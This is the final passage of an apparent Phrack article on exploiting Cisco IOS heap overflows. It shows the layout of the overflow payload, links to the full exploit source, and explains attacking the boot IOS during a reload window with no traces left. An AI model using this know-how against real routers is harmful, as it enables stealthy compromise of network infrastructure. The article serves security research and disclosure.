0x0B03 (11.3), just to make sure it works. The size field covers only the  
real config text - not the header.  
The checksum is calculated over the whole thing (header plus config) with  
the checksum field itself being set to zero. This is a standard one's  
complement checksum as you find in any IP implementation.  
  
When putting it all together, you should have something along the lines of:  
```  
 +--------------+  
 | AAAAAAAAAAAA |  
 ...  
 | AAAAAAAAAAAA |  
 +--------------+  
 | FAKE BLOCK   |  
 |              |  
 ....  
 +--------------+  
 | Bootstrap    |  
 |              |  
 ....  
 +--------------+  
 | config_copy  |  
 |   XOR pat    |  
 ....  
 +--------------+  
 | NVRAM header |  
 | + config     |  
 |   XOR pat    |  
 ....  
 +--------------+  
```  
...which you can now send to the Cisco router for execution. If everything  
works the way it is planned, the router will seemingly freeze for some  
time, because it's working the slow loops for NVRAM copy and does not allow  
interrupts, and should then reboot clean and nice.  
  
To save space for better papers, the full code is not included here but is  
available at http://www.phenoelit.de/ultimaratio/UltimaRatioVegas.c . It  
supports some adjustments for code offset, NOPs where needed and a slightly  
different fake block for 11.1 series IOS.  
  
--[ 6 - Everything not covered in 1-5  
  
A few assorted remarks that somehow did not fit into the rest of this text  
should be made, so they are made here.  
  
First of all, if you find or know an overflow vulnerability for IOS 11.x  
and you think that it is not worth all the trouble to exploit since  
everyone should run 12.x by now, let me challange this. Nobody with some  
experience on Cisco IOS will run the latest version. It just doesn't work  
correctly. Additionally, many people don't update their routers anyway. But  
the most interesting part is a thing called "Helper Image" or simply "boot  
IOS". This is a mini-IOS loaded right after the ROM monitor, which is  
normally a 11.x. On the smaller routers, it's a ROM image and can not be  
updated easily. For the bigger ones, people assured me that there are no  
12.x mini-IOSes out there they would put on a major production router. Now,  
when the Cisco boot up and starts the mini-IOS, it will read the config and  
work accordingly as long as the feature is supported. Many are - including  
the TFTP server. This gives an attacker a 3-8 seconds time window in which  
he can perform an overflow on the IOS, in case somone reloads the router.  
In case this goes wrong, the full-blown IOS still starts up, so there will  
be no traces of any hostile activity.  
  
The second item yours truly would like to point out are the different  
things one might want to explore for overflow attacks. The obvious one  
(used in this paper as example) is a service running on a Cisco router.  
Another point for overflowing stuff are protocols. No protocol inspection  
engine is perfect AFAYTK. So even if the IOS is just supposed to route  
the packet, but has to inspect the contents for some reason, you might find  
something there. And if all fails, there are still the debug based  
overflows. IOS offers a waste amount of debug commands for next to  
everything. These do normally display a lot of information comming right  
from the packet they received and don't always check the buffer they use  
for compiling the displayed string. Unfortunately, it requires someone to  
turn on debugging in the first place - but well, this might happen.  
  
And finally, some greets have to be in here. Those go to the following  
people in no particular order: Gaus of Cisco PSIRT, Nico of Securite.org,  
Dan of DoxPara.com, Halvar Flake, the three anonymous CCIEs/Cisco wizards  
yours truly keeps asking strange questions and of course FtR and Mr. V.H.,  
because without their equipment, there wouldn't be any research to speak  
of. Additional greets go to all people who research Cisco stuff and to whom  
yours truly had no chance to talk to so far - please get in touch with us.  
The last one goes to the vulnerability research labs out there: let me  
know if you need any help reproducing this `;-7  
  
--[ A - References  
  
[1] anonymous <d45a312a@author.phrack.org>  
    "Once upon a free()..."  
    Phrack Magazine, Volume 0x0b, Issue 0x39, Phile #0x09 of 0x12  
  
[2] Cisco Router IOS Memory Maps  
    http://www.cisco.com/warp/public/112/appB.html  
  
[3] GNU binutils  
    http://www.gnu.org/software/binutils/binutils.html  
  
[4] Motorola QUICC 68360 CPU Manual  
    MC68360UM, Page 6-70  
  
  
|=[ EOF ]=---------------------------------------------------------------=|  
